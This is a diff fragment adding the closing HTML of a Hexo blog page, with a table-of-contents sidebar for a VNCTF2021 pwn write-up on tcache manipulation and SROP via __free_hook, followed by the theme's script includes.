+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#VNCTF2021-PWN-LittleRedFlower"><span class="nav-number">1.</span> <span class="nav-text">VNCTF2021 PWN LittleRedFlower</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.</span> <span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%95%B4%E7%90%86"><span class="nav-number">1.2.</span> <span class="nav-text">题目整理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A5%BD%E5%83%8F%E8%AF%B4%E6%AF%94%E8%B5%9B%E7%BB%99%E4%BA%86HINT"><span class="nav-number">1.3.</span> <span class="nav-text">好像说比赛给了HINT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.4.</span> <span class="nav-text">解题思路()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%8E%E4%B9%88%E4%BF%AE%E6%94%B9TCACHE-MAX-BINS"><span class="nav-number">1.5.</span> <span class="nav-text">怎么修改TCACHE_MAX_BINS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0Tcache%E7%9A%84count"><span class="nav-number">1.6.</span> <span class="nav-text">伪造Tcache的count</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-number">1.6.1.</span> <span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%8C%E8%AE%A1%E7%AE%97"><span class="nav-number">1.6.2.</span> <span class="nav-text">方法二，计算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%80%E5%90%8E%E9%80%9A%E8%BF%87-free-hook%E6%9D%A5%E6%89%A7%E8%A1%8CSROP"><span class="nav-number">1.7.</span> <span class="nav-text">最后通过__free_hook来执行SROP</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
